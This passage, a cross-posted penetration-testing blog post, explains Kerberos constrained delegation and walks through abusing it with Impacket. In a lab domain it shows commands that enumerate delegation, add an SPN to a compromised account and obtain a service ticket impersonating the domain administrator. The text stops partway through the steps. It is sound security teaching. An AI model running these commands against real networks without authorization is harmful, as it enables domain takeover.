---
title: Abusing Delegation with Impacket (Part 2): Constrained Delegation
url: https://www.blackhillsinfosec.com/abusing-delegation-with-impacket-part-2/
source: Black Hills Information Security, Inc.
date: 2025-11-12
fetch_date: 2025-11-13T03:14:55.608949
---

# Abusing Delegation with Impacket (Part 2): Constrained Delegation

[![Black Hills Information Security, Inc.](https://www.blackhillsinfosec.com/wp-content/uploads/2025/03/BHIS_TEXT_BHIS.png)](https://www.blackhillsinfosec.com "Black Hills Information Security, Inc.")

[RSS](https://www.blackhillsinfosec.com/feed/)

* [All Services](https://www.blackhillsinfosec.com/services/)
  + [Complete Service Guide](https://www.blackhillsinfosec.com/services/complete-service-guide/)
  + [Active SOC](https://www.blackhillsinfosec.com/services/active-soc/)
  + [AI Security Assessments](https://www.blackhillsinfosec.com/services/ai-security-assessments/)
  + [Blockchain Security](https://www.blackhillsinfosec.com/services/blockchain-security/)
  + [Blue Team Services](https://www.blackhillsinfosec.com/services/blue-team-services/)
  + [Continuous Penetration Testing](https://www.blackhillsinfosec.com/services/antisoc/)
  + [High-Profile Risk Assessments](https://www.blackhillsinfosec.com/services/high-profile-risk-assessments/)
  + [Incident Response](https://www.blackhillsinfosec.com/services/incident-response/)
  + [Penetration Testing](https://www.blackhillsinfosec.com/services/)
* [Contact Us](https://www.blackhillsinfosec.com/contact-us/)
  + [Contact Us](https://www.blackhillsinfosec.com/contact-us/)
  + [Email Sign-Up](https://mailchi.mp/blackhillsinfosec.com/bhis-sign-up)
* [About Us](https://www.blackhillsinfosec.com/who-we-are/)
  + [Security Consultants](https://www.blackhillsinfosec.com/about/security-consultants/)
  + [Admin](https://www.blackhillsinfosec.com/about/admin-staff/)
  + [SOC Team](https://www.blackhillsinfosec.com/about/soc-team/)
  + [BHIS Family of Companies](https://www.blackhillsinfosec.com/bhis-tribe-of-companies/)
* [Free Resources](https://www.blackhillsinfosec.com/free-cybersecurity-tools/)
  + [Blogs](https://www.blackhillsinfosec.com/blog/)
  + [Free Cybersecurity Tools](https://www.blackhillsinfosec.com/free-cybersecurity-tools/)
  + [Free Cybersecurity Webcasts](https://www.blackhillsinfosec.com/free_cybersecurity_webcasts/)
  + [Podcasts](https://podcasts.apple.com/us/podcast/black-hills-information-security/id1410835265)
  + [RITA](https://www.activecountermeasures.com/free-tools/rita/)
* [Training](https://www.blackhillsinfosec.com/bhis-and-antisyphon-training/)
  + [BHIS & Antisyphon Training](https://www.blackhillsinfosec.com/bhis-and-antisyphon-training/)
  + [WWHF Conference](https://wildwesthackinfest.com)
* [Online Community](https://blackhillsinfosec.com/community)
  + [Discord](https://discord.gg/BHIS)
  + [LinkedIn](https://www.linkedin.com/company/black-hills-information-security/)
  + [YouTube](https://www.youtube.com/c/BlackHillsInformationSecurity/videos)
  + [Bluesky](https://bsky.app/profile/bhinfosecurity.bsky.social)
  + [Twitter/X](https://twitter.com/BHinfoSecurity)
  + [Upcoming Events](https://blackhillsinfosec.com/events)
* [Fun Stuff](https://spearphish-general-store.myshopify.com/)
  + [Backdoors & Breaches](https://www.blackhillsinfosec.com/tools/backdoorsandbreaches/)
  + [Merch, Zines & More](https://spearphish-general-store.myshopify.com/)
  + [PROMPT# Zine](https://www.blackhillsinfosec.com/prompt-zine/)
  + [REKCAH](https://www.blackhillsinfosec.com/rekcah/)
  + [Books](https://www.blackhillsinfosec.com/tools/books/)

12
Nov
2025

[How-To](https://www.blackhillsinfosec.com/category/how-to/), [Informational](https://www.blackhillsinfosec.com/category/informational/)
[Active Directory](https://www.blackhillsinfosec.com/tag/active-directory/), [Hunter Wade](https://www.blackhillsinfosec.com/tag/hunter-wade/), [Impacket](https://www.blackhillsinfosec.com/tag/impacket/), [Kerberos](https://www.blackhillsinfosec.com/tag/kerberos/)

# [Abusing Delegation with Impacket (Part 2): Constrained Delegation](https://www.blackhillsinfosec.com/abusing-delegation-with-impacket-part-2/)

![](https://www.blackhillsinfosec.com/wp-content/uploads/2025/11/HWade-150x150.png)

| [Hunter Wade](https://hunio.org/)

*Hunter recently graduated with his Master’s degree in Cyber Defense and has over two years of experience in penetration testing. His favorite area of testing is Active Directory, and in his free time, he enjoys working in his home lab and analyzing malware.*

![](https://www.blackhillsinfosec.com/wp-content/uploads/2025/11/del2_header.png)

This blog has been cross-posted. We’re grateful to Hunter for allowing us to share this insightful work—you can check out the original post in full [HERE](https://hunio.org/posts/security/abusing-delegation-with-impacket/).

This is the second in a three-part series of blog posts discussingl how to abuse Kerberos delegation! If you haven’t already, feel free to read the [first blog post](https://www.blackhillsinfosec.com/abusing-delegation-with-impacket-part-1-unconstrained-delegation/), as it discusses the Kerberos authentication process and how delegation plays an important role in solving the double-hop problem.

## What is constrained delegation?

Constrained delegation was introduced to mitigate the risks of unconstrained delegation. It restricts delegation to specific services and replaces TGT forwarding with two proxies: [S4U2Self](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/02636893-7a1f-4357-af9a-b672e3e3de13) and [S4U2Proxy](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/bde93b0e-f3c9-4ddf-9f44-e1453be7af5a).

There are two types of constrained delegation – **with** and **without protocol transition.** The key difference is how the impersonation is done.

* **Constrained with protocol transition:** Uses S4U2Self to impersonate users and S4U2Proxy to generate a service ticket to the delegated resource.
* **Constrained without protocol transition:** Does not use S4U2Self, but instead requires the client present a **forwardable** service ticket as the user you want to impersonate to the delegated resource.

## Constrained delegation with protocol transition abuse techniques

To abuse constrained delegation with protocol transition, we must first compromise a user or machine configured with it. Following this, our goal is to impersonate an elevated user/machine – usually the domain administrator – to compromise the service our compromised resource can delegate to.

The high-level steps are:

1. Compromise a user or machine that has constrained delegation configured.
2. Use S4U2Self and S4U2Proxy to obtain a service ticket as an elevated user to the delegated resource.

### 1. S4U2Self and S4U2Proxy with username and password

Assume we’ve compromised the user `kcduser` with the password `Password2@`, which is allowed to delegate to `host/DC01.secure.local`, being the domain controller.

To escalate in the domain, since protocol transition is enabled, we can use `kcduser`’s password to impersonate an elevated user – usually the domain administrator – using S4U2Self. Then, we can use S4U2Proxy to generate a service ticket to the delegated service (`host/DC01.secure.local`).

Additionally, we must have an SPN assigned to the compromised user to successfully generate tickets.

**1. Find user-based constrained delegation with protocol transition (`kcduser` to `host/DC01.secure.local`)**

```
impacket-findDelegation 'secure.local/kcduser':'Password2@' -dc-ip 10.0.1.200
```

![](https://www.blackhillsinfosec.com/wp-content/uploads/2025/11/Del_25.png)

**2. Add an SPN to `kcduser` if there isn’t one already (`KCD.secure.local`)**

```
python3 addspn.py -u secure.localkcduser -p 'Password2@' -s host/KCD.secure.local --target-type samname 10.0.1.200
```

![](https://www.blackhillsinfosec.com/wp-content/uploads/2025/11/Del_26.png)

**3. Using `kcduser`’s credentials, we can obtain a service ticket as the domain administrator to `DC01` (S4U2Self + S4U2Proxy)**

```
impacket-getST -spn 'host/DC01.secure.local' -impersonate administrator 'secure.local/kcduser':'Password2@' -dc-ip 10.0.1.200
```

![](https://www.blackhillsinfosec.com/wp-content/uploads/2025/11/Del_27.png)

**4. Export the ticket int...